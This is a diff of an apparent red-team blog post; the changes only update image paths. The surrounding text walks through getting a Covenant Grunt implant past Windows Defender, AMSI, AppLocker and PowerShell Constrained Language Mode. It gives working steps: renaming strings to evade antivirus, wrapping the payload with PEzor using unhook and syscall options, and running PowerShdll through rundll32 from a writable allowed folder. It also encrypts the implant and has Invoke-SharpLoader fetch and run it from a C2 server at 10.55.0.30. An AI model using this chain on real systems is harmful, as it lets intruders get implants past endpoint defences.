@@ -15,7 +15,7 @@ What can we do against AppLocker?
 What about PowerShell´s Constrained Language Mode?  
 AMSI who?  
 
-![broken]({{ site.baseurl }}/images/sailing/nopass.jpg "meme")
+![broken]({{ site.baseurl }}/images/2021-16-01/nopass.jpg "meme")
 
 ## Introduction  
 
@@ -32,7 +32,7 @@ The next thing is we will most likely want to gather some intel, so we copy our 
 
 BÄMMM - deleted!
 
-![broken]({{ site.baseurl }}/images/sailing/rubeus_deleted.png "ciao rubeus")
+![broken]({{ site.baseurl }}/images/2021-16-01/rubeus_deleted.png "ciao rubeus")
 
 Rubeus is malicious. Noooooo. AV flagged our tool because it is known to do harmful stuff, and the bad guys tend to abuse it´s functionalities.  
 
@@ -63,7 +63,7 @@ namespace GruntStager
 You can bet your ass that if some kind of AV sees the string ```GruntStager``` it will run amok.  
 Having that code in our VisualStudio we can highlight the string we want to replace and hit ```ctrl + r``` and type the new name to rename it trough out the whole project. We will also apply this to the public class and all other suspicious sounding parts we find and will end up with something like this:
 
-![broken]({{ site.baseurl }}/images/sailing/stager_rename.png "rename)  Grunt stager picture here
+![broken]({{ site.baseurl }}/images/2021-16-01/stager_rename.png "rename)  Grunt stager picture here
 
 What we can also do is concatenating strings instead if replacing them. So that ```GruntStager```becomes ```'Gru'+'ntS'+'ta'+'ger'```.  
 In several cases this is enough to fool AV.  
@@ -93,7 +93,7 @@ The most well known technique to me is to use PowerShell´s Invoke Expression fe
 Another possibility is to use [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) from - *who would have thought it* - S3cur3Th1sSh1t.  
 Okay so let´s bypass Defender by not touching the disc and put our default Grunt payload directly into memory:
 
-![broken]({{ site.baseurl }}/images/sailing/ASMI_catch.png "AMSI Catch")  
+![broken]({{ site.baseurl }}/images/2021-16-01/ASMI_catch.png "AMSI Catch")  
 
 Fuck! Something went wrong. Looks like we got catched by AMSI which detected a Covenant payload.  
 
@@ -103,8 +103,8 @@ If you would like to know more about how AMSI works - read this [post](https://s
 
 We can verify that it was AMSI by issuing ~~one of the random bypasses from [amsi.fail](https://amsi.fail)~~ the [AMSI bypass for C# from Rasta Mouse}(https://github.com/rasta-mouse/AmsiScanBufferBypass) and see it working afterwards with all the Defender features still turned on:  
 
-![broken]({{ site.baseurl }}/images/sailing/CSharp_AMSI_bypass.png "bypass")  
-![broken]({{ site.baseurl }}/images/sailing/CSharp_AMSI_bypass_grunt.png "bypass")  
+![broken]({{ site.baseurl }}/images/2021-16-01/CSharp_AMSI_bypass.png "bypass")  
+![broken]({{ site.baseurl }}/images/2021-16-01/CSharp_AMSI_bypass_grunt.png "bypass")  
 
 I failed hard for several times with all the amsi.fail bypasses for the Grunt payload. Talking to my boss (*you know the guy with the l33t name containing sh1t and stuff*) it turns out that for C# payloads - the 2nd stage of the Grunt payload which is C# - you need to have a bypass for C#. Holy moly, but that´s how it is.  
 
@@ -116,22 +116,22 @@ My attempts to combine the parts to chain a stealthy attack resulted in two appr
 #### Grunt.exe -> Nim Wrapper -> PEZor -> local execution  
 
 1. Create Grunt.exe  
-![broken]({{ site.baseurl }}/images/sailing/Create_Grunt_exe.png "create Grunt")  
+![broken]({{ site.baseurl }}/images/2021-16-01/Create_Grunt_exe.png "create Grunt")  
 
 2. Convert Grunt.exe to Nim byte array  
 ```CSharpToNimByteArray -inputfile .\GruntHTTP.exe```
-![broken]({{ site.baseurl }}/images/sailing/Convert_Grunt_to_array.png "convert to byte array")   
+![broken]({{ site.baseurl }}/images/2021-16-01/Convert_Grunt_to_array.png "convert to byte array")   
 
 3. Paste the byte array into the C# loader [template](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim) and build the C executable  
 ```nim c --passL:-Wl,--dynamicbase,--export-all-symbols .\LoadCSharp.nim```
 
 4. Wrap the C executable into PEZor  
 ```PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_Nim.exe -z 2```
-![broken]({{ site.baseurl }}/images/sailing/Building_PEZor.png "PEZor build")  
+![broken]({{ site.baseurl }}/images/2021-16-01/Building_PEZor.png "PEZor build")  
 
 5. Deploy  
-![broken]({{ site.baseurl }}/images/sailing/Covenant_PEZor_run.png "PEZor run")  
-![broken]({{ site.baseurl }}/images/sailing/Covenant_PEZor_success.png "PEZor success")  
+![broken]({{ site.baseurl }}/images/2021-16-01/Covenant_PEZor_run.png "PEZor run")  
+![broken]({{ site.baseurl }}/images/2021-16-01/Covenant_PEZor_success.png "PEZor success")  
 
 #### AppLocker & Constrained language bypass -> Powershell load script -> AMSI bypass -> Invoke-SharpLoader -> Encrypted Grunt
 
@@ -139,7 +139,7 @@ If there wasn´t the AppLocker bypass needed, one could also run this completely
 
 1. Identify a way to bypass AppLocker and ConstrainedLanguage
 
-![broken]({{ site.baseurl }}/images/sailing/everything_blocked.png  "All blocked")
+![broken]({{ site.baseurl }}/images/2021-16-01/everything_blocked.png  "All blocked")
 
 To check the current PS language mode we can run:  
 ```$ExecutionContext.SessionState.LanguageMode```  
@@ -147,14 +147,14 @@ To check the current PS language mode we can run:
 We can issue the following PS cmdlet to identify all AppLocker policies in place:  
 ```Get-ApplockerPolicy -Effective -xml > c:\users\luemmel\Desktop\applocker.xml```  
 
-![broken]({{ site.baseurl }}/images/sailing/applocker_allow_dll.png  "Allow dll")
+![broken]({{ site.baseurl }}/images/2021-16-01/applocker_allow_dll.png  "Allow dll")
 
 We can see that the **Everyone** group is allowed to run stuff from **C:\Program Files (x86)\hMailServer\**
 
 We can further check the ACLs on that folder with the following PS cmdlet:  
 ```Get-Acl -path 'C:\Program Files (x86)\hMailServer\' | fl```  
 
-![broken]({{ site.baseurl }}/images/sailing/acl_users_allowed.png  "Allowed users ACL")
+![broken]({{ site.baseurl }}/images/2021-16-01/acl_users_allowed.png  "Allowed users ACL")
 
 Which shows us that the **Users** group has write access to that specific folder. Perfect :)  
 
@@ -164,7 +164,7 @@ So now that we know how - let´s get our hands dirty.
 Compile [PowerShdll](https://github.com/p3nt4/PowerShdll) and copy to client to **C:\Program Files (x86)\hMailServer\** and run it:  
 ```rundll32 'C:\Program Files (x86)\hMailServer\PowerShdll.dll',main -w```  
 
-![broken]({{ site.baseurl }}/images/sailing/powershdll_popped.png  "PowerShdll popped")
+![broken]({{ site.baseurl }}/images/2021-16-01/powershdll_popped.png  "PowerShdll popped")
 
 3. Prepare Invoke-SharpLoader  
 Encrypt our default Grunt.exe    
@@ -173,14 +173,14 @@ Encrypt our default Grunt.exe
 Invoke-SharpEncrypt -file C:\Tools_manual\nim-1.4.2\examples\Offensive\GruntHTTP.exe -password LuemmelSec -outfile C:\users\Luemmel\Desktop\Grunt_SharpLoader.enc  
 ``` 
 
-![broken]({{ site.baseurl }}/images/sailing/sharpencrypt.png  "sharpencrypt")
+![broken]({{ site.baseurl }}/images/2021-16-01/sharpencrypt.png  "sharpencrypt")
 
 Host the encrypted file on our Covenant server under ```Listeners -> listener -> Hosted Files -> + Create```
 
 Adapt the Invoke-SharpLoader script to have it directly run it with our encrypted payload by adding this to the last line:  
 ```Invoke-SharpLoader -location http://10.55.0.30/Grunt_SharpLoader.enc -password LuemmelSec -noArgs```
 
-![broken]({{ site.baseurl }}/images/sailing/adapt_isl.png  "sharpencrypt")
+![broken]({{ site.baseurl }}/images/2021-16-01/adapt_isl.png  "sharpencrypt")
 
 And host this file as well on our Covenant server under i.e. /Invoke-SharpLoader  
 
@@ -196,8 +196,8 @@ Upload to our Covenant server under /init.
 
 *Guns loaded - give em hell*  
 
-![broken]({{ site.baseurl }}/images/sailing/guns_fired.png  "guns fired")
-![broken]({{ site.baseurl }}/images/sailing/grunt_incoming.png  "incoming")
-![broken]({{ site.baseurl }}/images/sailing/grunt_executes.png  "executing")
+![broken]({{ site.baseurl }}/images/2021-16-01/guns_fired.png  "guns fired")
+![broken]({{ site.baseurl }}/images/2021-16-01/grunt_incoming.png  "incoming")
+![broken]({{ site.baseurl }}/images/2021-16-01/grunt_executes.png  "executing")
 
 As you can see Defender would really like to upload our sample for further analysis but - nahhhh.
